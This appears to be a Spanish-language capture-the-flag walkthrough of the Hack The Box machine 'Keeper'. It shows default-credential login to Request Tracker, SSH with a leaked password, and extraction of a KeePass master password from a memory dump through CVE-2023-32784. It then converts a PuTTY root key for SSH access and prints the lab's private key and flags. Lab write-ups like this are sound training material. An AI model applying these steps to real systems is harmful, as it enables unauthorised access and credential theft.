---
tags:
  - env/linux
  - estado/completo
  - cert/oscp
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/machines/556
dificultad: Fácil
ip: 10.10.11.227
os: Linux
linked:
  - "[[Default credentials]]"
  - "[[Sensitive Information Exposure]]"
  - "[[KeePass Memory Dump]]"
  - "[[keepass]]"
  - "[[Memory Dump]]"
  - "[[putty]]"
  - "[[puttygen]]"
  - "[[Putty2SSH]]"
  - "[[SSH Key Manipulation]]"
---
# HackTheBox - Keeper

## Reconocimiento

### Nmap

Primero, realizamos un escaneo de todos los puertos TCP para identificar los servicios activos en la máquina.

```bash
nmap -Pn -p- --min-rate=1000 -T4 10.10.11.227
````

Luego, ejecutamos un escaneo más detallado sobre los puertos encontrados para obtener versiones de servicios y ejecutar scripts de reconocimiento básicos.
```Bash
nmap -p22,80 -Pn -sC -sV 10.10.11.227
```

**Resultados del escaneo:**
- **Puerto 22/tcp:** `ssh` (OpenSSH)
- **Puerto 80/tcp:** `http` (Nginx)
    

Dado que no poseemos credenciales para `SSH`, nuestra enumeración comenzará por el servicio web en el puerto 80.

### HTTP

Al navegar al puerto 80 (`http://10.10.11.227`), encontramos una página simple con un hipervínculo que redirige a `tickets.keeper.htb`.

> [!info] Actualizar /etc/hosts
> 
> Para poder resolver este dominio, debemos añadirlo a nuestro archivo /etc/hosts.
> 
> ```Bash
> echo "10.10.11.227 tickets.keeper.htb keeper.htb" | sudo tee -a /etc/hosts
> ```

Ahora podemos visitar `http://tickets.keeper.htb` y nos encontramos con una página de inicio de sesión de **Request Tracker (RT)**, un sistema de ticketing de código abierto.

Una búsqueda rápida en Google sobre "Request Tracker default credentials" revela las credenciales por defecto.

> [!tip] Credenciales por Defecto de Request Tracker
> 
> - **Usuario:** `root`
>     
> - **Contraseña:** `password`
>     

Logramos iniciar sesión exitosamente y aterrizamos en el panel de control de RT.


---

## Acceso Inicial (Foothold)

Dentro del panel, en la sección `Admin > Users`, observamos dos usuarios registrados: `root` y `lnorgaard`.

Al investigar al usuario `lnorgaard`, encontramos una contraseña en el campo de comentarios.

> [!success] Credenciales Encontradas
> 
> - **Usuario:** `lnorgaard`
>     
> - **Contraseña:** `Welcome2023!`
>     

Utilizamos estas credenciales para conectarnos vía `SSH`.
```Bash
ssh lnorgaard@10.10.11.227
```

El acceso es exitoso. Ahora podemos leer la flag del usuario.
```Bash
cat /home/lnorgaard/user.txt
```


---

## Escalada de Privilegios

Al revisar los archivos en el directorio home del usuario, encontramos un archivo `RT30000.zip`. Lo descomprimimos y encontramos dos archivos: `KeePassDumpFull.dmp` y `passcodes.kdbx`.
```Bash
unzip RT30000.zip
ls
```
- `passcodes.kdbx`: Una base de datos de contraseñas de KeePass, cifrada y protegida por una contraseña maestra.
- `KeePassDumpFull.dmp`: Un volcado de memoria, probablemente del proceso de KeePass.
    

### Explotación de KeePass (CVE-2023-32784)

Una búsqueda en Google sobre "keepass master password vulnerabilities" nos lleva a la vulnerabilidad **CVE-2023-32784** y a una [prueba de concepto (PoC)](https://github.com/vdohney/keepass-password-dumper) para extraer la contraseña maestra desde un volcado de memoria.

La vulnerabilidad se basa en que, por cada carácter que el usuario escribe en el campo de la contraseña maestra, se crea una cadena residual en la memoria. Por ejemplo, al escribir "Password", se generan las siguientes cadenas: `•a`, `••s`, `•••s`, `••••w`, `•••••o`, `••••••r`, `•••••••d`. La PoC escanea el volcado de memoria en busca de estos patrones y reconstruye la contraseña más probable.

Para explotar esto, primero transferimos el archivo `.zip` a nuestra máquina local usando `scp`.
```Bash
scp lnorgaard@10.10.11.227:/home/lnorgaard/RT30000.zip .
```

A continuación, clonamos el repositorio de la PoC y ejecutamos el script contra el archivo `.dmp`. (Requiere tener `dotnet` instalado).
```Bash
git clone [https://github.com/vdohney/keepass-password-dumper.git](https://github.com/vdohney/keepass-password-dumper.git)
cd keepass-password-dumper
dotnet run /ruta/a/tu/KeePassDumpFull.dmp
```

> [!success] Contraseña Maestra Potencial Recuperada
> 
> La herramienta sugiere la siguiente contraseña: dgrød med fløde

Ahora, necesitamos una herramienta para interactuar con la base de datos `.kdbx`. Instalamos `kpcli` (KeePass Command Line Interface).
```Bash
sudo apt-get install keepassxc -y
```

Abro `keepassxc` e importo `passcodes.kdbx`, para luego poner la contraseña obtenida.

Al introducir `dgrød med fløde`, obtenemos un error indicando que la clave es inválida. Una búsqueda rápida en Google de la frase nos sugiere que la forma correcta es **`rødgrød med fløde`**.

En `keepass` veo que el usuario root contiene una llave SSH privada en formato PuTTY.

### Alternativa 1: Línea de Comandos (puttygen)

Guardamos la llave en formato PuTTY en un archivo local (`ssh_key_file`) y la convertimos al formato estándar de OpenSSH usando `puttygen`.
```Bash
# Contenido de la llave PuTTY
echo "PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
Private-Lines: 14
AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0" > ssh_key_file
```

Uso `puttygen` con las siguientes opciones:
- `-O private-openssh`: Especifica el tipo de salida.
- `-o id_rsa`: Especifica el archivo de salida.
    
```Bash
puttygen ssh_key_file -O private-openssh -o id_rsa
```

> [!warning] Permisos de la Llave
> 
> Es crucial asignar los permisos correctos a la llave privada para que SSH la acepte.
> 
> ```Bash
> chmod 600 id_rsa
> ```

Finalmente, nos conectamos como `root` usando la nueva llave.
```Bash
ssh root@tickets.keeper.htb -i id_rsa
```

Obtenemos una shell como `root` y podemos leer la flag final en `/root/root.txt`.

### Alternativa 2: GUI con PuTTY

1. **Sesión:** Inicia PuTTY e introduce la dirección IP `10.10.11.227` en el campo `Host Name`.
2. **Autenticación:** Navega a `Connection > SSH > Auth > Credentials` y en el campo `Private key file for authentication`, selecciona el archivo de la llave PuTTY que guardaste (`ssh_key_file`).
3. **Conexión:** Haz clic en "Open". Cuando se te pida el usuario, introduce `root`.
    
Se establecerá una shell como `root` en la máquina víctima. La flag se encuentra en `/root/root.txt`.


---

## Bandera(s)

> [!flag] `flag{user}`
> 935137ed94974e708779ca875b2525be
^bandera-user

> [!flag] `flag{root}`
> a814e12926dd6e9d751f44b430aea695
^bandera-root

